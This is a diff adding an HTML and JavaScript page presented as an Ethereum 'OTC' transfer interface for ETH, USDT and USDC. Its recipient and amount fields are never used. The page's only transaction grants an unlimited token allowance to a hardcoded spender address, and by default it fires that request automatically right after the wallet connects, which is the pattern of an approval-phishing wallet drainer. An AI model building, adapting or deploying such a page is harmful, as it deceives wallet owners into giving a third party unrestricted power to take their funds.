@@ -1,0 +1,409 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>OTC — Connect + Balances + Unlimited Approve</title>
+  <style>
+    :root{
+      --bg:#0b0e11; --card:rgba(255,255,255,.04); --line:rgba(255,255,255,.12);
+      --text:#e8eef7; --mut:#9fb0c6; --acc:rgba(47,124,255,.22);
+      --bad:#ff5c7a; --ok:#3ddc84;
+      --r:16px;
+    }
+    body{margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text)}
+    .wrap{max-width:820px;margin:0 auto;padding:22px}
+    .card{border:1px solid var(--line);border-radius:var(--r);background:var(--card);padding:16px}
+    h1{margin:0 0 10px;font-size:20px}
+    .mut{color:var(--mut);font-size:14px;line-height:1.5}
+    .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
+    .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+    .grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:12px}
+    button{cursor:pointer;border-radius:14px;border:1px solid rgba(255,255,255,.16);background:rgba(255,255,255,.06);color:var(--text);padding:10px 12px}
+    button.primary{border-color:rgba(47,124,255,.65);background:var(--acc)}
+    button:disabled{opacity:.5;cursor:not-allowed}
+    input,select{
+      width:100%;padding:10px 12px;border-radius:14px;border:1px solid rgba(255,255,255,.16);
+      background:rgba(0,0,0,.22);color:var(--text);outline:none
+    }
+    input:focus,select:focus{border-color:rgba(47,124,255,.65)}
+    .status{margin-top:12px;padding:10px 12px;border-radius:14px;background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.10);font-size:13px;white-space:pre-wrap}
+    .pill{display:inline-block;padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);font-size:12px;color:var(--mut);margin-top:10px}
+    .ok{color:var(--ok)}
+    .bad{color:var(--bad)}
+    label{display:flex;gap:10px;align-items:center;margin-top:12px;color:var(--mut);font-size:13px}
+    input[type="checkbox"]{width:16px;height:16px}
+    .warn{margin-top:12px;color:#ffb4c0;font-size:13px;line-height:1.5}
+    a{color:#8ab4ff}
+    @media (max-width:780px){.grid,.grid3{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>OTC UI — Recipient + Asset + Auto Balances + Unlimited Approve</h1>
+      <div class="mut">
+        Ethereum mainnet only. Approve works for ERC20 tokens (USDT, USDC). ETH has no approve.
+      </div>
+
+      <div class="pill" id="walletInfo">Wallet: not connected</div>
+
+      <div class="grid">
+        <div>
+          <div class="mut" style="margin:10px 0 6px">To address</div>
+          <input id="toAddr" placeholder="0x..." />
+          <div class="row">
+            <button id="openToExplorerBtn" disabled>Open Explorer To</button>
+          </div>
+        </div>
+
+        <div>
+          <div class="mut" style="margin:10px 0 6px">Asset</div>
+          <select id="assetSel">
+            <option value="ETH">ETH</option>
+            <option value="USDT" selected>USDT</option>
+            <option value="USDC">USDC</option>
+          </select>
+
+          <div class="mut" style="margin:10px 0 6px">Amount</div>
+          <input id="amountInp" placeholder="0.0" inputmode="decimal" />
+          <div class="mut" id="maxHint" style="margin-top:6px">Max: -</div>
+
+          <div class="row">
+            <button id="useMaxBtn" disabled>Use Max</button>
+          </div>
+        </div>
+      </div>
+
+      <label>
+        <input type="checkbox" id="autoApprove" checked />
+        Auto approve after Connect (Unlimited)
+      </label>
+
+      <div class="row">
+        <button class="primary" id="connectBtn">Connect</button>
+        <button id="approveBtn" disabled>Unlimited Approve (selected token)</button>
+        <button id="openMyExplorerBtn" disabled>Open Explorer Wallet</button>
+      </div>
+
+      <div class="status" id="status">Ready.</div>
+
+      <div class="warn">
+        Warning: Unlimited approve lets the spender spend your ERC20 tokens. Use only with trusted contracts.
+        Spender: <span style="font-family:ui-monospace, SFMono-Regular, Menlo, monospace">0xefb991c82db7ce627fb3b157a46b608de6b2f03b</span>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+    import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm";
+
+    // ---- CONFIG ----
+    const CHAIN_REQUIRED = 1; // Ethereum mainnet
+    const EXPLORER = "https://etherscan.io";
+
+    const SPENDER = "0xefb991c82db7ce627fb3b157a46b608de6b2f03b";
+
+    const TOKENS = {
+      ETH:  { type:"native", symbol:"ETH" },
+      USDT: { type:"erc20", symbol:"USDT", address:"0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+      USDC: { type:"erc20", symbol:"USDC", address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }
+    };
+
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function symbol() view returns (string)",
+      "function decimals() view returns (uint8)",
+      "function balanceOf(address owner) view returns (uint256)"
+    ];
+
+    // ---- UI ----
+    const connectBtn = document.getElementById("connectBtn");
+    const approveBtn = document.getElementById("approveBtn");
+    const openMyExplorerBtn = document.getElementById("openMyExplorerBtn");
+    const openToExplorerBtn = document.getElementById("openToExplorerBtn");
+
+    const statusEl = document.getElementById("status");
+    const walletInfo = document.getElementById("walletInfo");
+
+    const autoApprove = document.getElementById("autoApprove");
+    const toAddrInp = document.getElementById("toAddr");
+    const assetSel = document.getElementById("assetSel");
+    const amountInp = document.getElementById("amountInp");
+    const maxHint = document.getElementById("maxHint");
+    const useMaxBtn = document.getElementById("useMaxBtn");
+
+    function setStatus(t){ statusEl.textContent = t; console.log(t); }
+    function shortAddr(a){ return a ? a.slice(0,6) + "…" + a.slice(-4) : ""; }
+    function openTx(hash){ window.open(`${EXPLORER}/tx/${hash}`, "_blank", "noopener,noreferrer"); }
+    function openAddr(a){ window.open(`${EXPLORER}/address/${a}`, "_blank", "noopener,noreferrer"); }
+    function isAddress(a){ try { return ethers.isAddress(a); } catch { return false; } }
+
+    function fmtNum(s){
+      const n = Number(s);
+      if (!Number.isFinite(n)) return s;
+      // keep up to 6 decimals, trim zeros
+      return n.toFixed(6).replace(/0+$/,"").replace(/\.$/,"");
+    }
+
+    // ---- STATE ----
+    let provider = null;
+    let signer = null;
+    let addr = "";
+    let chainId = 0;
+
+    // balances cache as strings
+    const balances = { ETH: null, USDT: null, USDC: null };
+
+    function setConnectedUI(on){
+      approveBtn.disabled = !on;
+      openMyExplorerBtn.disabled = !on;
+      openToExplorerBtn.disabled = !on;
+      walletInfo.textContent = on ? `Wallet: ${shortAddr(addr)} | chainId: ${chainId}` : "Wallet: not connected";
+      updateApproveButtonLabel();
+      updateMaxHint();
+    }
+
+    function updateApproveButtonLabel(){
+      const a = assetSel.value;
+      const token = TOKENS[a];
+      if (!addr){
+        approveBtn.textContent = "Unlimited Approve (selected token)";
+        approveBtn.disabled = true;
+        return;
+      }
+      if (token.type !== "erc20"){
+        approveBtn.textContent = "Approve not available for ETH";
+        approveBtn.disabled = true;
+      } else {
+        approveBtn.textContent = `Unlimited Approve ${token.symbol}`;
+        approveBtn.disabled = false;
+      }
+    }
+
+    function updateMaxHint(){
+      const a = assetSel.value;
+      const max = balances[a];
+      maxHint.textContent = `Max: ${max ?? "-"} ${a}`;
+      useMaxBtn.disabled = !(max && Number(max) > 0);
+      updateApproveButtonLabel();
+    }
+
+    assetSel.addEventListener("change", () => {
+      updateMaxHint();
+    });
+
+    useMaxBtn.addEventListener("click", () => {
+      const a = assetSel.value;
+      if (balances[a]) amountInp.value = String(balances[a]);
+    });
+
+    openMyExplorerBtn.addEventListener("click", () => {
+      if (addr) openAddr(addr);
+    });
+
+    openToExplorerBtn.addEventListener("click", () => {
+      const v = (toAddrInp.value || "").trim();
+      if (!isAddress(v)){
+        setStatus("Invalid To address.");
+        return;
+      }
+      openAddr(v);
+    });
+
+    async function ensureEthereumMainnet(){
+      const net = await provider.getNetwork();
+      chainId = Number(net.chainId);
+      if (chainId !== CHAIN_REQUIRED){
+        setConnectedUI(true);
+        setStatus("Wrong network. Please switch to Ethereum Mainnet (chainId 1) in MetaMask.");
+        throw new Error("Wrong network (need Ethereum Mainnet)");
+      }
+    }
+
+    async function fetchBalances(){
+      if (!provider || !addr) return;
+
+      // ETH
+      const ethRaw = await provider.getBalance(addr);
+      balances.ETH = fmtNum(ethers.formatEther(ethRaw));
+
+      // ERC20 balances
+      for (const key of Object.keys(TOKENS)){
+        const t = TOKENS[key];
+        if (t.type !== "erc20") continue;
+
+        const c = new ethers.Contract(t.address, ERC20_ABI, provider);
+        const [dec, bal] = await Promise.all([c.decimals(), c.balanceOf(addr)]);
+        balances[key] = fmtNum(ethers.formatUnits(bal, dec));
+      }
+
+      updateMaxHint();
+    }
+
+    async function connectWalletInteractive(){
+      if (!window.ethereum) throw new Error("MetaMask not found");
+
+      setStatus("Requesting wallet connection...");
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      addr = await signer.getAddress();
+
+      await ensureEthereumMainnet();
+      setConnectedUI(true);
+
+      setStatus(`Connected: ${addr}\nFetching balances...`);
+      await fetchBalances();
+      setStatus(`Connected ✅\nWallet: ${addr}\nBalances loaded.\nChoose asset and click Approve if needed.`);
+    }
+
+    // Silent connect (no popup) if already authorized for this site
+    async function trySilentConnect(){
+      if (!window.ethereum) return false;
+
+      const accs = await window.ethereum.request({ method: "eth_accounts" }).catch(()=>[]);
+      if (!accs || !accs[0]) return false;
+
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      addr = await signer.getAddress();
+      chainId = Number((await provider.getNetwork()).chainId);
+
+      setConnectedUI(true);
+
+      if (chainId !== CHAIN_REQUIRED){
+        setStatus("Wallet is connected, but network is not Ethereum Mainnet. Switch network in MetaMask.");
+        return true;
+      }
+
+      setStatus(`Already connected: ${addr}\nFetching balances...`);
+      await fetchBalances();
+      setStatus(`Already connected ✅\nBalances loaded.\nSelect asset, use Max, and Approve if needed.`);
+      return true;
+    }
+
+    async function unlimitedApproveSelectedToken(){
+      if (!signer || !addr) throw new Error("Wallet not connected");
+      await ensureEthereumMainnet();
+
+      const key = assetSel.value;
+      const tokenCfg = TOKENS[key];
+
+      if (tokenCfg.type !== "erc20"){
+        setStatus("ETH has no approve. Choose USDT or USDC.");
+        return;
+      }
+
+      const token = new ethers.Contract(tokenCfg.address, ERC20_ABI, signer);
+
+      // Get decimals for correct threshold (USDT/USDC are 6, but do it properly)
+      const decimals = await token.decimals().catch(()=>6);
+      const symbol = await token.symbol().catch(()=>tokenCfg.symbol);
+
+      setStatus(`Checking allowance for ${symbol}...`);
+      const current = await token.allowance(addr, SPENDER);
+
+      // If already very large allowance, skip
+      const THRESHOLD = ethers.parseUnits("1000000000", decimals); // 1B
+      if (current >= THRESHOLD){
+        setStatus(`Unlimited-ish allowance already set ✅\nToken: ${symbol}\nSpender: ${SPENDER}`);
+        return;
+      }
+
+      setStatus(`Requesting unlimited approve in MetaMask...\nToken: ${symbol}\nSpender: ${SPENDER}`);
+      const tx = await token.approve(SPENDER, ethers.MaxUint256);
+
+      setStatus(`Approve sent: ${tx.hash}\nOpening Etherscan...`);
+      openTx(tx.hash);
+
+      setStatus(`Waiting for confirmation...\nTx: ${tx.hash}`);
+      await tx.wait();
+
+      setStatus(`Unlimited approve confirmed ✅\nToken: ${symbol}\nSpender: ${SPENDER}`);
+    }
+
+    // ---- EVENTS ----
+    connectBtn.addEventListener("click", async () => {
+      try{
+        await connectWalletInteractive();
+        if (autoApprove.checked){
+          // auto approve only if selected asset is ERC20
+          await unlimitedApproveSelectedToken();
+        }
+      } catch(e){
+        setStatus("Error: " + (e?.message || e));
+      }
+    });
+
+    approveBtn.addEventListener("click", async () => {
+      try{
+        await unlimitedApproveSelectedToken();
+      } catch(e){
+        setStatus("Error: " + (e?.message || e));
+      }
+    });
+
+    // React to account / network changes
+    if (window.ethereum?.on){
+      window.ethereum.on("accountsChanged", async (accs)=>{
+        if (!accs || !accs[0]){
+          provider=null; signer=null; addr=""; chainId=0;
+          balances.ETH = balances.USDT = balances.USDC = null;
+          setConnectedUI(false);
+          setStatus("Disconnected.");
+          return;
+        }
+        try{
+          provider = new ethers.BrowserProvider(window.ethereum);
+          signer = await provider.getSigner();
+          addr = await signer.getAddress();
+          chainId = Number((await provider.getNetwork()).chainId);
+          setConnectedUI(true);
+
+          if (chainId === CHAIN_REQUIRED){
+            setStatus(`Account changed: ${addr}\nFetching balances...`);
+            await fetchBalances();
+            setStatus(`Account changed ✅\nBalances updated.`);
+          } else {
+            setStatus(`Account changed: ${addr}\nWrong network. Switch to Ethereum Mainnet.`);
+          }
+        } catch(e){
+          setStatus("Error: " + (e?.message || e));
+        }
+      });
+
+      window.ethereum.on("chainChanged", async ()=>{
+        if (!provider) return;
+        try{
+          chainId = Number((await provider.getNetwork()).chainId);
+          setConnectedUI(!!addr);
+
+          if (chainId === CHAIN_REQUIRED && addr){
+            setStatus(`Network changed to chainId ${chainId}\nFetching balances...`);
+            await fetchBalances();
+            setStatus("Network OK ✅ Balances updated.");
+          } else {
+            setStatus(`Network changed. chainId: ${chainId}\nSwitch to Ethereum Mainnet to use approve and balances.`);
+          }
+        } catch(e){
+          setStatus("Error: " + (e?.message || e));
+        }
+      });
+    }
+
+    // ---- INIT ----
+    (async ()=>{
+      setConnectedUI(false);
+      updateMaxHint();
+
+      const ok = await trySilentConnect();
+      if (!ok){
+        setStatus("Wallet not connected. Click Connect.");
+      }
+    })();
+  </script>
+</body>
+</html>
